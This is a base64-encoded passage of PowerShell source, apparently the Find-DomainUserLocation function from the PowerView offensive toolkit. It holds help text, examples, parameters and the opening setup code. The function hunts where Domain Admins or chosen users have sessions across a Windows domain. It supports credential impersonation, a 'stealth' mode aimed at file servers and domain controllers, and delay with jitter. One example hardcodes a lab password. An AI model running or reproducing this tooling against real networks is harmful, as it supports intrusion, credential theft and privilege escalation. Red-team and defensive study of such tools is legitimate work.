YWluc3QgdGhvc2Ugc2VydmVycy4gSWYgLUNyZWRlbnRpYWwgaXMgcGFzc2VkLAp0aGVuIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiBpcyB1c2VkIHRvIGltcGVyc29uYXRlIHRoZSBzcGVjaWZpZWQgdXNlcgpiZWZvcmUgZW51bWVyYXRpb24sIHJldmVydGluZyBhZnRlciB3aXRoIEludm9rZS1SZXZlcnRUb1NlbGYuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIGFuIGFycmF5IG9mIG9uZSBvciBtb3JlIGhvc3RzIHRvIGVudW1lcmF0ZSwgcGFzc2FibGUgb24gdGhlIHBpcGVsaW5lLgpJZiAtQ29tcHV0ZXJOYW1lIGlzIG5vdCBwYXNzZWQsIHRoZSBkZWZhdWx0IGJlaGF2aW9yIGlzIHRvIGVudW1lcmF0ZSBhbGwgbWFjaGluZXMKaW4gdGhlIGRvbWFpbiByZXR1cm5lZCBieSBHZXQtRG9tYWluQ29tcHV0ZXIuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIGNvbXB1dGVycyBBTkQgdXNlcnMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHF1ZXJ5IGZvciBjb21wdXRlcnMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIHNlYXJjaCBmb3IgY29tcHV0ZXIgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTZWFyY2hCYXNlCgpTcGVjaWZpZXMgdGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciBjb21wdXRlcnMsCmUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIuIFVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJVbmNvbnN0cmFpbmVkCgpTd2l0Y2guIFNlYXJjaCBjb21wdXRlciBvYmplY3RzIHRoYXQgaGF2ZSB1bmNvbnN0cmFpbmVkIGRlbGVnYXRpb24uCgouUEFSQU1FVEVSIENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBvcGVyYXRpbmcgc3lzdGVtLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VydmljZVBhY2sKClNlYXJjaCBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIHNlcnZpY2UgcGFjaywgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNpdGVOYW1lCgpTZWFyY2ggY29tcHV0ZXJzIGluIHRoZSBzcGVjaWZpYyBBRCBTaXRlIG5hbWUsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgVXNlcklkZW50aXR5CgpTcGVjaWZpZXMgb25lIG9yIG1vcmUgdXNlciBpZGVudGl0aWVzIHRvIHNlYXJjaCBmb3IuCgouUEFSQU1FVEVSIFVzZXJEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHF1ZXJ5IGZvciB1c2VycyB0byBzZWFyY2ggZm9yLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFVzZXJMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIHNlYXJjaCBmb3IgdGFyZ2V0IHVzZXJzLgoKLlBBUkFNRVRFUiBVc2VyU2VhcmNoQmFzZQoKU3BlY2lmaWVzIHRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCBmb3IgdGFyZ2V0IHVzZXJzLgplLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiLiBVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFVzZXJHcm91cElkZW50aXR5CgpTcGVjaWZpZXMgYSBncm91cCBpZGVudGl0eSB0byBxdWVyeSBmb3IgdGFyZ2V0IHVzZXJzLCBkZWZhdWx0cyB0byAnRG9tYWluIEFkbWlucy4KSWYgYW55IG90aGVyIHVzZXIgc3BlY2lmaWNhdGlvbnMgYXJlIHNldCwgdGhlbiBVc2VyR3JvdXBJZGVudGl0eSBpcyBpZ25vcmVkLgoKLlBBUkFNRVRFUiBVc2VyQWRtaW5Db3VudAoKU3dpdGNoLiBTZWFyY2ggZm9yIHVzZXJzIHVzZXJzIHdpdGggJyhhZG1pbkNvdW50PTEpJyAobWVhbmluZyBhcmUvd2VyZSBwcml2aWxlZ2VkKS4KCi5QQVJBTUVURVIgVXNlckFsbG93RGVsZWdhdGlvbgoKU3dpdGNoLiBTZWFyY2ggZm9yIHVzZXIgYWNjb3VudHMgdGhhdCBhcmUgbm90IG1hcmtlZCBhcyAnc2Vuc2l0aXZlIGFuZCBub3QgYWxsb3dlZCBmb3IgZGVsZWdhdGlvbicuCgouUEFSQU1FVEVSIENoZWNrQWNjZXNzCgpTd2l0Y2guIENoZWNrIGlmIHRoZSBjdXJyZW50IHVzZXIgaGFzIGxvY2FsIGFkbWluIGFjY2VzcyB0byBjb21wdXRlcnMgd2hlcmUgdGFyZ2V0IHVzZXJzIGFyZSBmb3VuZC4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIgZm9yIGNvbXB1dGVycywgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbiBhbmQgdGFyZ2V0IHN5c3RlbXMuCgouUEFSQU1FVEVSIFN0b3BPblN1Y2Nlc3MKClN3aXRjaC4gU3RvcCBodW50aW5nIGFmdGVyIGZpbmRpbmcgYWZ0ZXIgZmluZGluZyBhIHRhcmdldCB1c2VyLgoKLlBBUkFNRVRFUiBEZWxheQoKU3BlY2lmaWVzIHRoZSBkZWxheSAoaW4gc2Vjb25kcykgYmV0d2VlbiBlbnVtZXJhdGluZyBob3N0cywgZGVmYXVsdHMgdG8gMC4KCi5QQVJBTUVURVIgSml0dGVyCgpTcGVjaWZpZXMgdGhlIGppdHRlciAoMC0xLjApIHRvIGFwcGx5IHRvIGFueSBzcGVjaWZpZWQgLURlbGF5LCBkZWZhdWx0cyB0byArLy0gMC4zCgouUEFSQU1FVEVSIFNob3dBbGwKClN3aXRjaC4gUmV0dXJuIGFsbCB1c2VyIGxvY2F0aW9uIHJlc3VsdHMgaW5zdGVhZCBvZiBmaWx0ZXJpbmcgYmFzZWQgb24gdGFyZ2V0CnNwZWNpZmljYXRpb25zLgoKLlBBUkFNRVRFUiBTdGVhbHRoCgpTd2l0Y2guIE9ubHkgZW51bWVyYXRlIHNlc3Npb25zIGZyb20gY29ubm9ubHkgdXNlZCB0YXJnZXQgc2VydmVycy4KCi5QQVJBTUVURVIgU3RlYWx0aFNvdXJjZQoKVGhlIHNvdXJjZSBvZiB0YXJnZXQgc2VydmVycyB0byB1c2UsICdERlMnIChkaXN0cmlidXRlZCBmaWxlIHNlcnZlcnMpLAonREMnIChkb21haW4gY29udHJvbGxlcnMpLCAnRmlsZScgKGZpbGUgc2VydmVycyksIG9yICdBbGwnICh0aGUgZGVmYXVsdCkuCgouUEFSQU1FVEVSIFRocmVhZHMKClRoZSBudW1iZXIgb2YgdGhyZWFkcyB0byB1c2UgZm9yIHVzZXIgc2VhcmNoaW5nLCBkZWZhdWx0cyB0byAyMC4KCi5FWEFNUExFCgpGaW5kLURvbWFpblVzZXJMb2NhdGlvbgoKU2VhcmNoZXMgZm9yICdEb21haW4gQWRtaW5zJyBieSBlbnVtZXJhdGluZyBldmVyeSBjb21wdXRlciBpbiB0aGUgZG9tYWluLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluVXNlckxvY2F0aW9uIC1TdGVhbHRoIC1TaG93QWxsCgpFbnVtZXJhdGVzIGxpa2VseSBoaWdobHktdHJhZmZpY2tlZCBzZXJ2ZXJzLCBwZXJmb3JtcyBqdXN0IHNlc3Npb24gZW51bWVyYXRpb24KYWdhaW5zdCBlYWNoLCBhbmQgb3V0cHV0cyBhbGwgcmVzdWx0cy4KCi5FWEFNUExFCgpGaW5kLURvbWFpblVzZXJMb2NhdGlvbiAtVXNlckFkbWluQ291bnQgLUNvbXB1dGVyT3BlcmF0aW5nU3lzdGVtICdXaW5kb3dzIDcqJyAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsCgpFbnVtZXJhdGVzIFdpbmRvd3MgNyBjb21wdXRlcnMgaW4gZGV2LnRlc3RsYWIubG9jYWwgYW5kIHJldHVybnMgdXNlciByZXN1bHRzIGZvciBwcml2aWxlZ2VkCnVzZXJzIGluIGRldi50ZXN0bGFiLmxvY2FsLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkZpbmQtRG9tYWluVXNlckxvY2F0aW9uIC1Eb21haW4gdGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKU2VhcmNoZXMgZm9yIGRvbWFpbiBhZG1pbiBsb2NhdGlvbnMgaW4gdGhlIHRlc3RsYWIubG9jYWwgdXNpbmcgdGhlIHNwZWNpZmllZCBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LlVzZXJMb2NhdGlvbgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlVzZXJMb2NhdGlvbicpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnVXNlckdyb3VwSWRlbnRpdHknKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRE5TSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJEb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VhcmNoQmFzZSwKCiAgICAgICAgW0FsaWFzKCdVbmNvbnN0cmFpbmVkJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQ29tcHV0ZXJVbmNvbnN0cmFpbmVkLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnT3BlcmF0aW5nU3lzdGVtJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZXJ2aWNlUGFjaycpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VydmljZVBhY2ssCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTaXRlTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2l0ZU5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdVc2VySWRlbnRpdHknKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkVXNlcklkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJEb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckxEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlclNlYXJjaEJhc2UsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdVc2VyR3JvdXBJZGVudGl0eScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdHcm91cE5hbWUnLCAnR3JvdXAnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFVzZXJHcm91cElkZW50aXR5ID0gJ0RvbWFpbiBBZG1pbnMnLAoKICAgICAgICBbQWxpYXMoJ0FkbWluQ291bnQnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRVc2VyQWRtaW5Db3VudCwKCiAgICAgICAgW0FsaWFzKCdBbGxvd0RlbGVnYXRpb24nKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRVc2VyQWxsb3dEZWxlZ2F0aW9uLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRDaGVja0FjY2VzcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0b3BPblN1Y2Nlc3MsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICREZWxheSA9IDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAuMCwgMS4wKV0KICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1Nob3dBbGwnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRTaG93QWxsLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTdGVhbHRoLAoKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgnREZTJywgJ0RDJywgJ0ZpbGUnLCAnQWxsJyldCiAgICAgICAgJFN0ZWFsdGhTb3VyY2UgPSAnQWxsJywKCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKCiAgICBCRUdJTiB7CgogICAgICAgICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Ruc2hvc3RuYW1lJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckRvbWFpbiddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRDb21wdXRlckRvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJMREFQRmlsdGVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRDb21wdXRlckxEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2VhcmNoQmFzZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkQ29tcHV0ZXJTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVbmNvbnN0cmFpbmVkJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1VuY29uc3RyYWluZWQnXSA9ICRVbmNvbnN0cmFpbmVkIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck9wZXJhdGluZ1N5c3RlbSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydPcGVyYXRpbmdTeXN0ZW0nXSA9ICRPcGVyYXRpbmdTeXN0ZW0gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2VydmljZVBhY2snXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmljZVBhY2snXSA9ICRTZXJ2aWNlUGFjayB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTaXRlTmFtZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTaXRlTmFtZSddID0gJFNpdGVOYW1lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJFVzZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VySWRlbnRpdHkgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFVzZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJMREFQRmlsdGVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJFVzZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRVc2VyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFkbWluQ291bnQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydBZG1pbkNvdW50J10gPSAkVXNlckFkbWluQ291bnQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBbGxvd0RlbGVnYXRpb24nXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydBbGxvd0RlbGVnYXRpb24nXSA9ICRVc2VyQWxsb3dEZWxlZ2F0aW9uIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEAoKQoKICAgICAgICAjIGZpcnN0LCBidWlsZCB0aGUgc2V0IG9mIGNvbXB1dGVycyB0byBlbnVtZXJhdGUKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gQCgkQ29tcHV0ZXJOYW1lKQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU3RlYWx0aCddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIFN0ZWFsdGggZW51bWVyYXRpb24gdXNpbmcgc291cmNlOiAkU3RlYWx0aFNvdXJjZSIKICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlckFycmF5TGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAoKICAgICAgICAgICAgICAgIGlmICgkU3RlYWx0aFNvdXJjZSAtbWF0Y2ggJ0ZpbGV8QWxsJykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gUXVlcnlpbmcgZm9yIGZpbGUgc2VydmVycycKICAgICAgICAgICAgICAgICAgICAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJEZpbGVTZXJ2ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckRvbWFpbiddKSB7ICRGaWxlU2VydmVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkQ29tcHV0ZXJTZWFyY2hCYXNlIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkRmlsZVNlcnZlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEZpbGVTZXJ2ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkRmlsZVNlcnZlc